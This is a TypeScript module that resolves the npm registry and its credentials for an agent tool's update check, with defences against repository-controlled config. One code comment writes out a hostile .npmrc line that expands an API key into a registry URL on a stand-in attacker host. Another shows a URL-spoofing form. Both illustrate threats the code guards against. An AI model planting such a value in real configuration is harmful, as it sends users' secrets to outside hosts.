/**
 * npm registry resolution for update checks.
 *
 * The install half of `gjc update` shells out to bun/npm, so it already honours
 * whatever registry the user configured. The *version check* half did not — it
 * fetched `registry.npmjs.org` directly. On networks that mirror or block the
 * public registry (corporate Nexus/Artifactory proxies, air-gapped setups) the
 * check fails even though the install that follows it would have worked, so
 * `gjc update` reports `Failed to fetch release info:` and exits 1.
 *
 * This module resolves the registry — and its credentials — the way npm does,
 * so the check agrees with the install.
 *
 * Two deliberate departures from npm, both because this runs inside an agent
 * the user launches in repositories they did not write:
 *
 *   - No project (`<cwd>/.npmrc`) layer. A repository must not be able to name
 *     the host this process talks to, nor supply an `${ENV}`-expanded token to
 *     send there. npm agrees for this case anyway: it skips project config in
 *     global mode, and the check exists to gate a global install.
 *   - The environment is read through `$credentialEnv`, which excludes the
 *     `cwd/.env` overlay Bun merges into `Bun.env`, and is distrusted entirely
 *     when an npm lifecycle is detected, because npm synthesizes `npm_config_*`
 *     from the project `.npmrc` with `${VAR}` already expanded.
 *
 * Not read, so the scope claim is not overstated: proxy configuration (`proxy`,
 * `https-proxy`, `noproxy`) lands in the parsed map but nothing consumes it, and
 * `bunfig.toml` is not parsed at all. `<cwd>/bunfig.toml` is excluded for the
 * same reason as the project `.npmrc`; `~/.bunfig.toml` is simply unimplemented,
 * so a mirror declared only there is checked against the public registry while
 * `bun install -g` installs from the mirror.
 */
import * as os from "node:os";
import * as path from "node:path";
import { $credentialEnv, isEnoent } from "@gajae-code/utils";

export const DEFAULT_NPM_REGISTRY = "https://registry.npmjs.org";

const DEFAULT_TIMEOUT_MS = 10_000;
const PACKUMENT_ACCEPT = "application/vnd.npm.install-v1+json, application/json";

export type NpmConfigOrigin = "env" | "user" | "global";

/** Which package manager will run the install this check is gating. */
export type Installer = "bun" | "npm";

/** Injection points so tests never read the real environment. */
export interface NpmRegistryEnvironment {
	/** Manager that will perform the install; decides Bun-vs-npm config priority. */
	installer?: Installer;
	/** Resolves an executable on PATH; used to locate npm's effective prefix. */
	whichExecutable?: (name: string) => string | undefined;
	/** Defaults to `$credentialEnv`, which excludes the caller's `cwd/.env`. */
	lookupEnv?: (name: string) => string | undefined;
	homeDir?: string;
	platform?: NodeJS.Platform;
	readFile?: (filePath: string) => Promise<string | undefined>;
}

export interface ResolvedNpmRegistry {
	registry: string;
	headers: Record<string, string>;
	origin: NpmConfigOrigin | "default";
	/** Where the value came from, e.g. `$npm_config_registry` or `~/.npmrc`. */
	source: string;
	/** Config files that exist but could not be read. */
	warnings: string[];
}

export interface LatestPackageVersion {
	version: string;
	registry: string;
	/** Config problems that did not stop the lookup but changed its outcome. */
	warnings: string[];
}

export interface FetchResponseLike {
	ok: boolean;
	status: number;
	statusText: string;
	json: () => Promise<unknown>;
}

export type FetchLike = (
	input: string,
	init?: { headers?: Record<string, string>; signal?: AbortSignal },
) => Promise<FetchResponseLike>;

export interface NpmRegistryLookupOptions extends NpmRegistryEnvironment {
	fetchImpl?: FetchLike;
	timeoutMs?: number;
}

/** Thrown when a registry is configured but unusable, so it is never silently ignored. */
export class NpmRegistryConfigError extends Error {}

interface ConfigValue {
	value: string;
	/** The exact variable or file the value came from, for diagnostics. */
	source: string;
}

interface ConfigLayer {
	origin: NpmConfigOrigin;
	/** True when the layer is repository-influenced and must not be consulted. */
	untrusted?: boolean;
	get: (key: string) => ConfigValue | undefined;
}

interface ConfigEntry {
	value: string;
	origin: NpmConfigOrigin;
	source: string;
}

async function defaultReadFile(filePath: string): Promise<string | undefined> {
	try {
		return await Bun.file(filePath).text();
	} catch (err) {
		if (isEnoent(err)) return undefined;
		throw err;
	}
}

/** Expand `${VAR}` references the way npm expands them while reading `.npmrc`. */
function expandEnvRefs(value: string, lookupEnv: (name: string) => string | undefined): string {
	return value.replace(/\$\{([^}]+)\}/g, (match, name: string) => lookupEnv(name) ?? match);
}

/**
 * Apply ini value rules: a quoted value is taken verbatim, an unquoted one ends
 * at the first unescaped `#` or `;`. Without this, `registry=https://host  # note`
 * survives as a URL whose comment becomes a fragment, and the request 404s
 * against a registry that installs fine.
 */
function unquoteIniValue(raw: string): string {
	const trimmed = raw.trim();
	const quote = trimmed[0];
	if ((quote === '"' || quote === "'") && trimmed.length >= 2 && trimmed.endsWith(quote)) {
		return trimmed.slice(1, -1);
	}

	let out = "";
	for (let i = 0; i < trimmed.length; i++) {
		const char = trimmed[i];
		if (char === "\\" && (trimmed[i + 1] === "#" || trimmed[i + 1] === ";" || trimmed[i + 1] === "\\")) {
			out += trimmed[++i];
			continue;
		}
		if (char === "#" || char === ";") break;
		out += char;
	}
	return out.trim();
}

/**
 * Parse an `.npmrc` into raw key/value pairs. Later duplicates win, as in npm.
 *
 * @internal Exported for tests; production code goes through `resolveNpmRegistry`.
 */
export function parseNpmrc(contents: string, lookupEnv: (name: string) => string | undefined = () => undefined) {
	const values = new Map<string, string>();
	let inSection = false;
	for (const rawLine of contents.replace(/^\uFEFF/, "").split(/\r?\n/)) {
		const line = rawLine.trim();
		if (!line || line.startsWith("#") || line.startsWith(";")) continue;
		// `[section]` opens a nested ini table. npm reads only top-level keys, so
		// everything inside a section is inactive config, not a top-level default.
		if (line.startsWith("[")) {
			inSection = true;
			continue;
		}
		if (inSection) continue;
		const separator = line.indexOf("=");
		if (separator <= 0) continue;
		const key = line.slice(0, separator).trim();
		if (key) values.set(key, expandEnvRefs(unquoteIniValue(line.slice(separator + 1)), lookupEnv));
	}
	return values;
}

/**
 * npm exports config as `npm_config_<key>`, lowercasing ordinary keys but
 * preserving the case of `//host/path/:field` credential keys ("nerf darts").
 */
function envNamesFor(key: string): string[] {
	const names = [`npm_config_${key}`];
	if (!key.startsWith("//") && !key.startsWith("@")) names.push(`NPM_CONFIG_${key.toUpperCase()}`);
	return names;
}

/**
 * npm's own lifecycle synthesizes `npm_config_*` from the *project* `.npmrc`,
 * expanding `${VAR}` against the parent environment on the way. Launching GJC
 * through `npm run` inside a cloned repository therefore hands us a registry —
 * and credentials — that the repository chose:
 *
 *   .npmrc: registry=https://svc:${ANTHROPIC_API_KEY}@collect.attacker.example/
 *   child:  npm_config_registry=https://svc:<the real key>@collect.attacker.example/
 *
 * Excluding the project `.npmrc` layer does not close that door, because npm
 * re-opens it through the environment. When an npm lifecycle is detected the
 * environment is treated as repository-influenced and contributes nothing; the
 * user-owned file layers still apply, so a legitimate mirror keeps working.
 */
function launchedByNpmLifecycle(lookupEnv: (name: string) => string | undefined): boolean {
	return Boolean(lookupEnv("npm_lifecycle_event") || lookupEnv("npm_execpath") || lookupEnv("npm_command"));
}

function createEnvLayer(
	lookupEnv: (name: string) => string | undefined,
	installer: Installer | undefined,
): ConfigLayer {
	const untrusted = launchedByNpmLifecycle(lookupEnv);
	return {
		origin: "env",
		untrusted,
		get: key => {
			if (untrusted) return undefined;
			if (key === "registry") {
				// Only prefer Bun's variable when Bun is the manager that will run the
				// install; the npm-managed path ignores BUN_CONFIG_REGISTRY entirely,
				// and preferring it there makes the check disagree with the install.
				const bun = lookupEnv("BUN_CONFIG_REGISTRY")?.trim();
				if (bun && installer !== "npm") return { value: bun, source: "$BUN_CONFIG_REGISTRY" };
				for (const name of envNamesFor(key)) {
					const value = lookupEnv(name)?.trim();
					if (value) return { value, source: `$${name}` };
				}
				if (bun) return { value: bun, source: "$BUN_CONFIG_REGISTRY" };
				return undefined;
			}
			for (const name of envNamesFor(key)) {
				const value = lookupEnv(name)?.trim();
				// npm skips empty env config; without this an exported-but-unset
				// `npm_config_registry=` would mask the user's `.npmrc`.
				if (value) return { value, source: `$${name}` };
			}
			return undefined;
		},
	};
}

function expandHome(filePath: string, homeDir: string): string {
	if (filePath === "~") return homeDir;
	if (filePath.startsWith("~/") || filePath.startsWith("~\\")) return path.join(homeDir, filePath.slice(2));
	return filePath;
}

function globalNpmrcCandidates(
	env: ConfigLayer,
	lookupEnv: (name: string) => string | undefined,
	homeDir: string,
	platform: NodeJS.Platform,
	whichExecutable: (name: string) => string | undefined,
): string[] {
	const configured = env.get("globalconfig")?.value;
	if (configured) return [expandHome(configured, homeDir)];

	const prefix = env.get("prefix")?.value;
	if (prefix) return [path.join(expandHome(prefix, homeDir), "etc", "npmrc")];

	// `npm config set registry <url> --location=global` writes under the install
	// prefix, and $npm_config_globalconfig only exists inside `npm run`.
	// npm's global config lives under its *effective* prefix, which for nvm, fnm,
	// Volta, or any custom install is nowhere near the fixed paths below. Derive
	// it from where npm actually is: <prefix>/bin/npm -> <prefix>/etc/npmrc.
	const candidates: string[] = [];
	const npmPath = whichExecutable("npm");
	if (npmPath) candidates.push(path.join(path.dirname(path.dirname(npmPath)), "etc", "npmrc"));

	if (platform === "win32") {
		// npm derives this from %APPDATA%, which is not an npm_config_* variable.
		const appData = env.get("appdata")?.value ?? lookupEnv("APPDATA")?.trim();
		if (appData) candidates.push(path.join(appData, "npm", "etc", "npmrc"));
		return candidates;
	}
	candidates.push("/usr/local/etc/npmrc", "/opt/homebrew/etc/npmrc", "/etc/npmrc");
	return candidates;
}

async function createFileLayer(
	origin: NpmConfigOrigin,
	candidates: string[],
	readFile: (filePath: string) => Promise<string | undefined>,
	lookupEnv: (name: string) => string | undefined,
	warnings: string[],
): Promise<ConfigLayer | undefined> {
	for (const filePath of candidates) {
		let contents: string | undefined;
		try {
			contents = await readFile(filePath);
		} catch (err) {
			// A file that exists but cannot be read is a silent registry loss otherwise.
			warnings.push(`${filePath} could not be read: ${err instanceof Error ? err.message : String(err)}`);
			continue;
		}
		if (contents === undefined) continue;
		const values = parseNpmrc(contents, lookupEnv);
		return {
			origin,
			get: key => {
				const value = values.get(key);
				return value === undefined ? undefined : { value, source: filePath };
			},
		};
	}
	return undefined;
}

async function collectLayers(
	environment: NpmRegistryEnvironment,
	warnings: string[],
	readFailures: string[],
): Promise<ConfigLayer[]> {
	const lookupEnv = environment.lookupEnv ?? $credentialEnv;
	const readFile = environment.readFile ?? defaultReadFile;
	const platform = environment.platform ?? process.platform;
	let homeDir: string;
	try {
		homeDir = environment.homeDir ?? os.homedir();
	} catch {
		homeDir = "";
	}

	const whichExecutable = environment.whichExecutable ?? ((name: string) => Bun.which(name) ?? undefined);
	const env = createEnvLayer(lookupEnv, environment.installer);
	if (env.untrusted) {
		warnings.push(
			"npm_config_* was ignored because GJC was launched by an npm lifecycle, " +
				"where those variables can be synthesized from a repository .npmrc",
		);
	}
	const layers: ConfigLayer[] = [env];

	const userConfig = env.get("userconfig")?.value;
	const userCandidates = userConfig
		? [expandHome(userConfig, homeDir)]
		: homeDir
			? [path.join(homeDir, ".npmrc")]
			: [];
	const user = await createFileLayer("user", userCandidates, readFile, lookupEnv, readFailures);
	if (user) layers.push(user);

	const globalCandidates = globalNpmrcCandidates(env, lookupEnv, homeDir, platform, whichExecutable);
	const global = await createFileLayer("global", globalCandidates, readFile, lookupEnv, readFailures);
	if (global) layers.push(global);

	return layers;
}

function lookupConfig(layers: ConfigLayer[], key: string): ConfigEntry | undefined {
	for (const layer of layers) {
		const found = layer.get(key);
		if (found && found.value !== "") {
			return { value: found.value, origin: layer.origin, source: found.source };
		}
	}
	return undefined;
}

/** `@scope/name` → `@scope`. A name like `@scope` with no slash has no scope. */
function packageScope(packageName: string): string | undefined {
	const slash = packageName.indexOf("/");
	return packageName.startsWith("@") && slash > 1 ? packageName.slice(0, slash) : undefined;
}

interface NormalizedRegistry {
	registry: string;
	/** Basic credentials lifted out of a `https://user:pass@host` registry URL. */
	userinfo?: string;
}

/** `decodeURIComponent` throws on a literal `%`, which survives WHATWG userinfo parsing. */
function decodeComponent(value: string): string {
	try {
		return decodeURIComponent(value);
	} catch {
		return value;
	}
}

/**
 * Hide the authority of a value that failed validation, so a misconfigured
 * `registry=user:secret@host` cannot be echoed into a terminal or a bug report.
 *
 * The value is by definition unparseable, so a leading `svc-npm:` is as likely
 * to be a username as a scheme. Only the unambiguous `scheme://` form is kept;
 * everything else before the authority's last `@` is dropped.
 */
function redactAuthority(value: string): string {
	const scheme = /^[a-z][a-z0-9+.-]*:\/\//i.exec(value)?.[0] ?? "";
	const rest = value.slice(scheme.length);
	const authorityEnd = rest.search(/[/?#]/);
	const authority = authorityEnd === -1 ? rest : rest.slice(0, authorityEnd);
	const at = authority.lastIndexOf("@");
	if (at !== -1) return `${scheme}***@${rest.slice(at + 1)}`;

	// A single-slash scheme such as `ssh:/user:pw@host` puts the credential
	// outside the authority window; drop everything before the last `@` anyway.
	const tail = value.lastIndexOf("@");
	return tail === -1 ? value : `***@${value.slice(tail + 1)}`;
}

/**
 * Validate the registry and lift any embedded credentials out of it, so a
 * password in the URL can never reach a request path, an error message, or a
 * pasted bug report.
 */
function normalizeRegistry(value: string): NormalizedRegistry | undefined {
	const trimmed = value.trim();
	if (!trimmed) return undefined;

	let url: URL;
	try {
		url = new URL(trimmed);
	} catch {
		return undefined;
	}
	if (url.protocol !== "http:" && url.protocol !== "https:") return undefined;

	// A bare username with no password is never a real credential — it is the
	// shape of `https://trusted.example.com@attacker.example.com`, where the
	// "user" is the host the reader's eye stops at. Strip it, promote nothing.
	let userinfo: string | undefined;
	if (url.password) {
		userinfo = Buffer.from(`${decodeComponent(url.username)}:${decodeComponent(url.password)}`).toString("base64");
	}
	url.username = "";
	url.password = "";

	return { registry: url.toString().replace(/\/+$/, ""), userinfo };
}

/**
 * Build the credential lookup keys npm calls "nerf darts": `//host/path/`,
 * walking up one path segment at a time until the bare host.
 *
 * @internal Exported for tests; production code goes through `resolveNpmRegistry`.
 */
export function credentialPrefixes(registry: string): string[] {
	let url: URL;
	try {
		url = new URL(registry);
	} catch {
		return [];
	}
	const segments = url.pathname.split("/").filter(Boolean);
	const prefixes: string[] = [];
	for (let i = segments.length; i >= 0; i--) {
		const pathname = segments.slice(0, i).join("/");
		prefixes.push(`//${url.host}/${pathname ? `${pathname}/` : ""}`);
	}
	return prefixes;
}

/** Reject a `_password` that is not really base64: decoding never throws, it corrupts. */
function decodeBase64Password(password: string): string | undefined {
	const decoded = Buffer.from(password, "base64");
	if (decoded.toString("base64").replace(/=+$/, "") !== password.replace(/=+$/, "")) return undefined;
	return decoded.toString("utf8");
}

function isPlaintextRemote(registry: string): boolean {
	const url = new URL(registry);
	if (url.protocol !== "http:") return false;
	const host = url.hostname;
	return host !== "localhost" && host !== "127.0.0.1" && host !== "[::1]";
}

function resolveAuthHeaders(
	registry: string,
	userinfo: string | undefined,
	layers: ConfigLayer[],
	warnings: string[],
): Record<string, string> {
	// No credential of any form reaches a remote plaintext origin. This decision
	// comes first so it also covers credentials embedded in the registry URL,
	// which previously took an early return and bypassed it entirely.
	if (isPlaintextRemote(registry)) {
		const configured = userinfo !== undefined || credentialPrefixes(registry).some(p => hasCredential(layers, p));
		if (configured) {
			warnings.push(`credentials configured for ${registry} were withheld because it is plaintext http`);
		}
		return {};
	}

	// Credentials written into the registry URL are inseparable from it.
	if (userinfo) return { Authorization: `Basic ${userinfo}` };

	for (const prefix of credentialPrefixes(registry)) {
		const read = (field: string): string | undefined =>
			lookupConfig(layers, `${prefix}:${field}`)?.value ??
			lookupConfig(layers, `${prefix.replace(/\/$/, "")}:${field}`)?.value;

		const authToken = read("_authToken");
		if (authToken) return { Authorization: `Bearer ${authToken}` };

		const auth = read("_auth");
		if (auth) return { Authorization: `Basic ${auth}` };

		const username = read("username");
		const password = read("_password");
		if (username && password) {
			const decoded = decodeBase64Password(password);
			if (decoded !== undefined) {
				return { Authorization: `Basic ${Buffer.from(`${username}:${decoded}`).toString("base64")}` };
			}
		}
	}
	return {};
}

function hasCredential(layers: ConfigLayer[], prefix: string): boolean {
	const read = (field: string): string | undefined =>
		lookupConfig(layers, `${prefix}:${field}`)?.value ??
		lookupConfig(layers, `${prefix.replace(/\/$/, "")}:${field}`)?.value;

	if (read("_authToken") || read("_auth")) return true;

	const password = read("_password");
	return Boolean(read("username") && password && decodeBase64Password(password) !== undefined);
}

/** Resolve the registry npm/bun would use for `packageName`, with credentials attached. */
export async function resolveNpmRegistry(
	packageName: string,
	environment: NpmRegistryEnvironment = {},
): Promise<ResolvedNpmRegistry> {
	const warnings: string[] = [];
	// Kept apart from `warnings`: only a config file that exists but cannot be
	// read justifies refusing to fall back, and an informational notice must not.
	const readFailures: string[] = [];
	const layers = await collectLayers(environment, warnings, readFailures);
	const scope = packageScope(packageName);

	// npm resolves the scoped key first, then the generic one, each across all layers.
	const entry = (scope ? lookupConfig(layers, `${scope}:registry`) : undefined) ?? lookupConfig(layers, "registry");
	if (!entry) {
		// An unreadable config file is not the same as no config file: falling back
		// to the public registry there is exactly the silent divergence being fixed.
		if (readFailures.length) {
			throw new NpmRegistryConfigError(
				`no usable npm registry configuration: ${readFailures.join("; ")} (set npm_config_registry to override)`,
			);
		}
		return { registry: DEFAULT_NPM_REGISTRY, headers: {}, origin: "default", source: "built-in default", warnings };
	}

	const normalized = normalizeRegistry(entry.value);
	if (!normalized) {
		// Falling back to the public registry here would silently reintroduce the
		// bug this module exists to remove.
		throw new NpmRegistryConfigError(
			`npm config registry from ${entry.source} is not a valid http(s) URL: ${redactAuthority(entry.value)}`,
		);
	}

	return {
		registry: normalized.registry,
		headers: resolveAuthHeaders(normalized.registry, normalized.userinfo, layers, warnings),
		origin: entry.origin,
		source: entry.source,
		warnings: [...warnings, ...readFailures],
	};
}

/**
 * Registries can live under a path prefix, so join by string rather than `new URL`.
 *
 * @internal Exported for tests; production code goes through `fetchLatestPackageVersion`.
 */
export function buildRegistryPackageUrl(registry: string, packageName: string, spec?: string): string {
	const base = `${registry.replace(/\/+$/, "")}/${packageName}`;
	return spec ? `${base}/${spec}` : base;
}

function describeSource(resolved: ResolvedNpmRegistry): string {
	return resolved.origin === "default" ? "" : ` (registry from ${resolved.source})`;
}

function withWarnings(message: string, warnings: string[]): string {
	return warnings.length ? `${message}; ${warnings.join("; ")}` : message;
}

interface VersionResponse {
	version?: string;
	"dist-tags"?: { latest?: string };
}

async function requestJson(
	url: string,
	resolved: ResolvedNpmRegistry,
	options: NpmRegistryLookupOptions,
	signal: AbortSignal,
): Promise<{ status: number; data?: VersionResponse; failure?: string }> {
	const doFetch = options.fetchImpl ?? (fetch as unknown as FetchLike);

	let response: FetchResponseLike;
	try {
		response = await doFetch(url, { headers: { Accept: PACKUMENT_ACCEPT, ...resolved.headers }, signal });
	} catch (err) {
		const timedOut = signal.aborted || (err instanceof Error && err.name === "TimeoutError");
		const reason = timedOut ? "timed out" : `failed: ${err}`;
		return { status: 0, failure: `${url} request ${reason}${describeSource(resolved)}` };
	}

	if (!response.ok) {
		const reason = response.statusText ? `${response.status} ${response.statusText}` : `${response.status}`;
		return { status: response.status, failure: `${url} responded ${reason}${describeSource(resolved)}` };
	}

	try {
		return { status: response.status, data: (await response.json()) as VersionResponse };
	} catch {
		// An abort during the body read arrives here too, and is not interception.
		if (signal.aborted) {
			return { status: response.status, failure: `${url} request timed out${describeSource(resolved)}` };
		}
		// A captive portal or block page answering 200 with HTML lands here; the
		// bare SyntaxError alone would name neither the URL nor the registry.
		return {
			status: response.status,
			failure: `${url} returned a non-JSON body${describeSource(resolved)} — a proxy is probably intercepting this request`,
		};
	}
}

function readVersion(data: VersionResponse | undefined): string | undefined {
	return data?.version ?? data?.["dist-tags"]?.latest;
}

/** Fetch the latest published version of `packageName` from the configured registry. */
export async function fetchLatestPackageVersion(
	packageName: string,
	options: NpmRegistryLookupOptions = {},
): Promise<LatestPackageVersion> {
	const resolved = await resolveNpmRegistry(packageName, options);
	// One deadline for the whole lookup, so the packument retry cannot double it.
	const signal = AbortSignal.timeout(options.timeoutMs ?? DEFAULT_TIMEOUT_MS);

	const latestUrl = buildRegistryPackageUrl(resolved.registry, packageName, "latest");
	const latest = await requestJson(latestUrl, resolved, options, signal);
	const version = readVersion(latest.data);
	if (version) return { version, registry: resolved.registry, warnings: resolved.warnings };

	// `/{pkg}/latest` is a registry-API convenience route; a mirror that only
	// serves packuments — which is all the installer itself needs — 404s it.
	if (latest.status === 404 || (!latest.failure && !version)) {
		const packumentUrl = buildRegistryPackageUrl(resolved.registry, packageName);
		const packument = await requestJson(packumentUrl, resolved, options, signal);
		const fallback = readVersion(packument.data);
		if (fallback) return { version: fallback, registry: resolved.registry, warnings: resolved.warnings };
		throw new Error(
			withWarnings(packument.failure ?? latest.failure ?? `${packumentUrl} returned no version`, resolved.warnings),
		);
	}

	throw new Error(withWarnings(latest.failure ?? `${latestUrl} returned no version`, resolved.warnings));
}
